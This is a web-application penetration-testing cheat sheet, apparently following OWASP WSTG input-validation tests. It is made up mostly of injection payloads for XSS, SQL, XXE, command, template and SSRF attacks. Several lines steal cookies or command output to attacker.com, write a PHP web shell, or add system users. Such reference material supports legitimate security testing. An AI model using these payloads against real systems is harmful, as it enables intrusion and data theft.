# 4.7 Input Validation Testing (WSTG-INPV)

Largest WSTG category. Covers every injection-style vulnerability where input crosses a boundary into an interpreter, a renderer, a database, a parser, or a request constructor.

**Quick navigation:**
- [WSTG-INPV-01 Reflected XSS](#wstg-inpv-01-reflected-xss)
- [WSTG-INPV-02 Stored XSS](#wstg-inpv-02-stored-xss)
- [WSTG-INPV-03 HTTP Verb Tampering](#wstg-inpv-03-http-verb-tampering)
- [WSTG-INPV-04 HTTP Parameter Pollution](#wstg-inpv-04-http-parameter-pollution)
- [WSTG-INPV-05 SQL Injection](#wstg-inpv-05-sql-injection) (MySQL / MSSQL / PostgreSQL / Oracle / MS Access / NoSQL / ORM / Web SQL)
- [WSTG-INPV-06 LDAP Injection](#wstg-inpv-06-ldap-injection)
- [WSTG-INPV-07 XML Injection / XXE](#wstg-inpv-07-xml-injection--xxe)
- [WSTG-INPV-08 SSI Injection](#wstg-inpv-08-ssi-injection)
- [WSTG-INPV-09 XPath Injection](#wstg-inpv-09-xpath-injection)
- [WSTG-INPV-10 IMAP/SMTP Injection](#wstg-inpv-10-imapsmtp-injection)
- [WSTG-INPV-11 Code Injection + LFI/RFI](#wstg-inpv-11-code-injection--lfirfi)
- [WSTG-INPV-12 Command Injection](#wstg-inpv-12-command-injection)
- [WSTG-INPV-13 Format String Injection](#wstg-inpv-13-format-string-injection)
- [WSTG-INPV-14 Incubated (Second-Order)](#wstg-inpv-14-incubated-vulnerabilities-second-order)
- [WSTG-INPV-15 HTTP Splitting/Smuggling](#wstg-inpv-15-http-splittingsmuggling)
- [WSTG-INPV-17 Host Header Injection](#wstg-inpv-17-host-header-injection)
- [WSTG-INPV-18 SSTI](#wstg-inpv-18-server-side-template-injection-ssti)
- [WSTG-INPV-19 SSRF](#wstg-inpv-19-server-side-request-forgery-ssrf)

---

## WSTG-INPV-01: Reflected XSS
**Test Contexts:**
```html
<!-- HTML context -->
<script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- Attribute context -->
" onmouseover="alert(1)
' onmouseover='alert(1)

<!-- JavaScript context -->
';alert(1)//
\';alert(1)//

<!-- URL context -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

**Filter Bypass:**
```html
<ScRiPt>alert(1)</ScRiPt>                  # Case variation
<script>alert`1`</script>                  # Template literals
<img src=x onerror=alert&#40;1&#41;>       # HTML entities
%3Cscript%3Ealert(1)%3C/script%3E         # URL encoded
<img src=x onerror=alert(1)>         # Unicode escape
<script>eval(atob('YWxlcnQoMSk='))</script> # Base64
```

---

## WSTG-INPV-02: Stored XSS
**Targets:** Comment fields, profile names, user-generated content, forum posts, ticketing systems.

**Cookie Stealing Payload:**
```javascript
<script>document.write('<img src="http://attacker.com/steal?c='+document.cookie+'">')</script>
```

**SQL + Stored XSS (second order):**
```sql
UPDATE footer SET notice = 'Copyright <script>document.write(\'<img src="http://attacker.com/?c=\'+document.cookie+\'"/>\');</script>' WHERE id=1;
```

---

## WSTG-INPV-03: HTTP Verb Tampering
**Test:** Send requests with unusual verbs (`HEAD`, `TRACE`, `ARBITRARY`) to bypass auth checks.

---

## WSTG-INPV-04: HTTP Parameter Pollution
**Test:** Send same parameter multiple times; different frameworks take first, last, or all values.
```
GET /search?query=legitimate&query=<script>alert(1)</script>
```

---

## WSTG-INPV-05: SQL Injection

**Detection Payloads:**
```sql
'
''
`
')
'))
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
" OR 1=1--
1' ORDER BY 1--
1' ORDER BY 2--
1' UNION SELECT NULL--
```

**Error-Based (MySQL):**
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND (SELECT 1 FROM (SELECT COUNT(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

**Union-Based:**
```sql
' ORDER BY 3--                          # Find column count
' UNION SELECT NULL,NULL,NULL--         # Match columns
' UNION SELECT NULL,username,password FROM users--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
```

**Blind Boolean:**
```sql
' AND 1=1--   # True condition
' AND 1=2--   # False condition
' AND substring(username,1,1)='a'--
```

**Blind Time-Based:**
```sql
' AND SLEEP(5)--                        # MySQL
'; WAITFOR DELAY '0:0:5'--              # MSSQL
' AND 1=1 AND pg_sleep(5)--            # PostgreSQL
' AND 1=(SELECT 1 FROM dual WHERE DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1)--  # Oracle
```

**MySQL Specifics:**
```sql
-- Information gathering
SELECT @@version; SELECT @@datadir; SELECT user();
-- File read
SELECT LOAD_FILE('/etc/passwd');
-- File write
SELECT '<?php system($_GET["cmd"])?>' INTO OUTFILE '/var/www/shell.php';
-- Stack queries (requires mysqli_multi_query)
'; INSERT INTO users(login,password) VALUES ('hacked','hacked')--
```

**MSSQL Specifics:**
```sql
'; EXEC xp_cmdshell('whoami')--
'; EXEC xp_cmdshell('net user hacker Pass123 /add')--
'; DECLARE @q NVARCHAR(200); SET @q='select * from users'; EXEC(@q)--
-- Error-based
'; SELECT * FROM nonexistent_table--
-- Read file
'; BULK INSERT tempTable FROM 'c:\windows\system32\drivers\etc\hosts'--
```

**PostgreSQL Specifics:**
```sql
-- Read file
'; COPY TO STDOUT '/etc/passwd'--
-- Command execution
'; COPY cmd_exec FROM PROGRAM 'whoami'--
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
-- Error-based
'; SELECT cast(version() as int)--
```

**Oracle Specifics:**
```sql
' UNION SELECT NULL FROM DUAL--
' AND (SELECT UPPER(XMLType(chr(60)||chr(58)||chr(58)||(SELECT version FROM v$instance)||chr(62))) FROM DUAL)=1--
-- No SLEEP equivalent, use heavy query
' AND 1=(SELECT COUNT(*) FROM all_users a, all_users b, all_users c)--
```

**MS Access Specifics:**
```sql
-- No comments (/* -- #), no stacked queries
-- Null byte bypass
http://target.com/page.asp?id=1'%00
-- TOP/LAST instead of LIMIT
' UNION SELECT TOP 1 name FROM MSysObjects%00
-- Blind character extraction
IIF((select MID(LAST(username),1,1) from (select TOP 10 username from users))='a',0,'no')
```

**NoSQL Injection (MongoDB):**
```
# Special chars that break queries: ' " \ ; { }
# HTTP parameter pollution to inject $where
?user=admin&user[$ne]=1     # Not-equal operator
?user[$regex]=.*            # Regex match all
?user[$gt]=                 # Greater than
# DoS via $where
?$where=function(){var date=new Date();do{curDate=new Date();}while(curDate-date<10000)}
```

**ORM Injection (Hibernate):**
```java
// Vulnerable Hibernate
session.createQuery("from Orders where id = " + id)
// Inject:
id = "1 OR 1=1"
id = "1; DROP TABLE users"
```

**Client-Side SQL Injection (Web SQL):**
```javascript
// Identify with: openDatabase(), transaction(), executeSQL()
// Payload in URL fragment: #15 OR 1=1
```

**Tools:** sqlmap, Havij, BBQSQL (blind), sqlninja (MSSQL)

---

## WSTG-INPV-06: LDAP Injection
**LDAP Metacharacters:** `& | ! = ~= >= <= * ( ) `

**Authentication Bypass:**
```
Username: *)(uid=*))(|(uid=*
Password: password
# Resulting filter: (&(uid=*)(uid=*))(|(uid=*)(password=...))
```

**Wildcard Search (dump all):**
```
?user=*   # Filter: (cn=*) - matches all
```

**Tools:** Softerra LDAP Browser

---

## WSTG-INPV-07: XML Injection / XXE
**XXE (XML External Entity) Payloads:**
```xml
<!-- File disclosure -->
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>

<!-- Windows -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]>

<!-- SSRF via XXE -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/receive?">]>

<!-- DoS (Billion Laughs) -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

**XML Injection Metacharacters:** `' " < > <!-- --> &amp; <![CDATA[`

**Tag Injection (Privilege Escalation):**
```
email=user@example.com</mail><userid>0</userid><mail>user@example.com
```

**Vulnerable Java APIs:** `DocumentBuilder`, `SAXParser`, `XMLReader`, `DocumentBuilderFactory`, `SAXParserFactory`

**Vulnerable C APIs:** `libxml2` (xmlParseInNodeContext, xmlReadDoc, etc.)

---

## WSTG-INPV-08: SSI Injection
**Indicator:** `.shtml` extension or SSI configured in web server

**SSI Payloads:**
```
<!--#echo var="DOCUMENT_NAME" -->
<!--#include virtual="/etc/passwd" -->
<!--#exec cmd="id" -->
<!--#exec cmd="cat /etc/passwd" -->
```

**Header-based SSI:**
```
Referer: <!--#exec cmd="/bin/ps ax"-->
User-Agent: <!--#include virtual="/proc/version"-->
```

---

## WSTG-INPV-09: XPath Injection
**Auth Bypass:**
```
Username: ' or '1' = '1
Password: ' or '1' = '1
# Resulting XPath: //user[username='' or '1'='1' and password='' or '1'='1']
```

---

## WSTG-INPV-10: IMAP/SMTP Injection
**Test:** Inject CRLF (`%0d%0a`) into mail-related parameters to inject additional IMAP/SMTP commands.
```
?mailbox=INBOX%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 1
```

---

## WSTG-INPV-11: Code Injection + LFI/RFI

**Dangerous APIs for Source Review:**
| Language | Dangerous Functions |
|----------|---------------------|
| PHP | `eval()`, `system()`, `exec()`, `shell_exec()`, `passthru()`, `proc_open()`, `include()`, `require()`, `preg_replace()` with `/e` |
| Python | `exec()`, `eval()`, `os.system()`, `os.popen()`, `subprocess.call()` |
| Java | `Runtime.exec()` |
| Ruby | `` ` `` (backtick), `system()`, `exec()`, `%x{}` |
| Node.js | `eval()`, `child_process.exec()` |

**PHP LFI Payloads:**
```
?file=../../../../etc/passwd
?file=../../../../etc/passwd%00    # Null byte (PHP < 5.3.4)
?file=php://filter/convert.base64-encode/resource=index.php
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==
?file=expect://id                  # PHP expect extension
?file=zip://../uploads/shell.jpg%23shell.php  # Zip wrapper
```

**RFI Payload:**
```
?file=http://attacker.com/shell.php
?file=https://attacker.com/shell.php
```

**LFI Log Poisoning → RCE:**
```bash
# Poison User-Agent in log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
# Then include log
?file=../../../../var/log/apache2/access.log&cmd=id
```

**Tools:** kadimus, LFI Suite, OWASP ZAP

---

## WSTG-INPV-12: Command Injection
**Special Characters:**
```
| ; & $() `` > < ' !
```

**Operator Behavior:**
| Operator | Behavior |
|----------|----------|
| `cmd1\|cmd2` | cmd2 runs regardless |
| `cmd1;cmd2` | cmd2 runs regardless |
| `cmd1\|\|cmd2` | cmd2 only if cmd1 fails |
| `cmd1&&cmd2` | cmd2 only if cmd1 succeeds |
| `$(cmd)` | Subshell execution |
| `` `cmd` `` | Subshell execution |

**Payloads:**
```
http://target.com/cgi-bin/ping.pl?host=127.0.0.1|id
http://target.com/something.php?dir=;cat /etc/passwd
doc=Doc1.pdf+|+dir c:\
; whoami
& whoami
| whoami
`whoami`
$(whoami)
; curl http://attacker.com/$(whoami)
```

**Out-of-band Detection (Blind):**
```
; curl http://collaborator.com/
; nslookup collaborator.com
; ping -c 1 collaborator.com
```

**Tools:** Commix, OWASP WebGoat, Burp Collaborator for OOB

---

## WSTG-INPV-13: Format String Injection
**Detection Payloads:**
```
%s%s%s%n          # Crash or leak memory (C)
%p%p%p%p%p        # Pointer leak (C)
%25s               # URL-encoded %s
{event.__init__.__globals__[CONFIG][SECRET_KEY]}  # Python/Jinja2 SSTI-style
```

**wfuzz Testing:**
```bash
wfuzz -c -z file,fuzz.txt,urlencode https://target.com/page?username=FUZZ
```

---

## WSTG-INPV-14: Incubated Vulnerabilities (Second-Order)
**Pattern:** Inject payload → stored → retrieved/executed later in different context.

**Example (Second-Order XSS via DB):**
```sql
INSERT INTO username VALUES ('<script>alert(document.cookie)</script>');
-- When this username is later displayed in an admin panel without encoding → XSS fires
```

---

## WSTG-INPV-15: HTTP Splitting/Smuggling
**HTTP Response Splitting (CRLF Injection):**
```
?redirect=advanced%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Injected</html>
```

**Target Headers:** `Location:`, `Set-Cookie:` (contain user-controlled data)

**HTTP Request Smuggling:**
- TE.CL: Frontend uses Transfer-Encoding, Backend uses Content-Length
- CL.TE: Frontend uses Content-Length, Backend uses Transfer-Encoding
- Tools: HTTP Request Smuggler (Burp extension), smuggler.py

---

## WSTG-INPV-17: Host Header Injection
**Payloads:**
```
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

**Attack Scenarios:**
- Password reset poisoning (reset link uses Host header)
- Cache poisoning
- SSRF via Host header in internal services

---

## WSTG-INPV-18: Server-Side Template Injection (SSTI)
**Detection (polyglot):**
```
{{7*7}}         → 49 (Jinja2/Twig)
${7*7}          → 49 (FreeMarker/Thymeleaf)
#{7*7}          → 49 (Pebble/Spring EL)
<%= 7*7 %>      → 49 (ERB)
${{7*7}}        → 49 (Mako)
*{7*7}          → 49 (Thymeleaf)
a{*comment*}b   → ab (Smarty)
${foobar}       → Error (Velocity, FreeMarker)
```

**Jinja2 RCE (Python):**
```python
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

**Twig (PHP):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Velocity (Java):**
```java
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
```

**FreeMarker (Java):**
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
```

**Tools:** Tplmap, Backslash Powered Scanner (Burp extension)

---

## WSTG-INPV-19: Server-Side Request Forgery (SSRF)
**Payloads:**
```
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin
http://[::1]/admin
http://169.254.169.254/latest/meta-data/    # AWS metadata
http://169.254.169.254/computeMetadata/v1/  # GCP metadata
http://100.100.100.200/                     # Alibaba metadata
file:///etc/passwd
dict://localhost:6379/info                  # Redis
gopher://localhost:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a  # Redis via Gopher
```

**127.0.0.1 Filter Bypasses:**
```
http://2130706433/           # Decimal IP
http://017700000001/         # Octal IP
http://127.1/                # Short IP
http://0x7f000001/           # Hex IP
http://localhost/
http://[::1]/
http://expected@attacker.com  # @ bypass
http://attacker.com#expected  # # bypass
http://attacker.com%09expected # Tab bypass
http://127.0.0.1.nip.io/    # DNS redirect to 127.0.0.1
```

**SSRF via PDF/Image Generation:**
```html
<iframe src="file:///etc/passwd" width="400" height="400">
<img src="http://internal-service/admin">
```

**Blind SSRF (OOB):**
```
http://burp-collaborator-url/
```

**Tools:** Burp Collaborator, SSRFMAP, interactsh (projectdiscovery)
